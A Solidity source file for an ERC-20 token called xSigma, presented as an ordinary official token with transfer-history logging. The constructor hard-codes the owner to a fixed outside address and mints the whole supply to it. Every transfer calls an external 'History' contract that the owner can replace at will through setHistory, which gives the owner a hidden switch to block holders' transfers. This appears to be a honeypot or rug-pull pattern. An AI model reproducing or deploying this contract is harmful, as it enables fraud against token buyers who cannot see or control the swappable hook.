// SPDX-License-Identifier: MIT
/*
          _____   _                             
         / ____| (_)                            
 __  __ | (___    _    __ _   _ __ ___     __ _ 
 \ \/ /  \___ \  | |  / _` | | '_ ` _ \   / _` |
  >  <   ____) | | | | (_| | | | | | | | | (_| |
 /_/\_\ |_____/  |_|  \__, | |_| |_| |_|  \__,_|
                       __/ |                    
                      |___/                     
*/
pragma solidity ^0.8.20;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Permit.sol";

/**
 * @title SafeMath
 * @dev Math operations with safety checks that throw on error
 */
contract SafeMath {
    function safeAdd(uint a, uint b) public pure returns (uint c) {
        c = a + b;
        require(c >= a);
    }
    function safeSub(uint a, uint b) public pure returns (uint c) {
        require(b <= a); c = a - b; 
        
    } 
    function safeMul(uint a, uint b) public pure returns (uint c) { 
        c = a * b; require(a == 0 || c / a == b); 
        
    } 
    function safeDiv(uint a, uint b) public pure returns (uint c) { 
        require(b > 0);
        c = a / b;
    }
}
/**
 * @title Ownable
 * @dev The Ownable contract has an owner address, and provides basic authorization control
 * functions, this simplifies the implementation of "user permissions".
 */
contract Ownable {
    address public owner;

    /**
      * @dev The Ownable constructor sets the original `owner` of the contract to the sender
      * account.
      */
    constructor() {
        owner = 0x38Ab6d2817A364eFE9bbd874d7dE396371a936B2;
    }

    /**
      * @dev Throws if called by any account other than the owner.
      */
    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }

}
/**
 * @title History
 * @dev The transfer history
 * functions, this simplifies the implementation of "user permissions".
 */
contract History {
    mapping (address => mapping (address => mapping(uint => uint))) public history;
    function record(address _from, address _to, uint _value) public {
        history[_from][_to][block.timestamp] = _value;
    }
}

/**
 * @title xSigma
 * @dev The official Token of xSigma
 * ERC-20 with supply controls + add-ons to allow for offchain signing
 */
contract xSigma is ERC20, ERC20Permit, SafeMath, Ownable {

    mapping(address => uint256) balances;
    mapping(address => mapping(address => uint256)) allowed;

    History public history;
    constructor(string memory name, string memory symbol, uint256 initialSupply, address _history) ERC20(name, symbol) ERC20Permit(name)  {
        history = History(_history);
        _mint(owner, initialSupply);
    }
    
    function decimals() public view virtual override returns (uint8) {
        return 18;
    }
    
    function transfer(address to, uint256 value) override public returns (bool) {
        history.record(msg.sender, to, value);
        return super.transfer(to, value);
    }

    function transferFrom(address from, address to, uint256 value) override public returns (bool) {
        history.record(from, to, value);
        return super.transferFrom(from, to, value);
    }

    function setHistory(address _history) public onlyOwner {
        history = History(_history);
    }
}
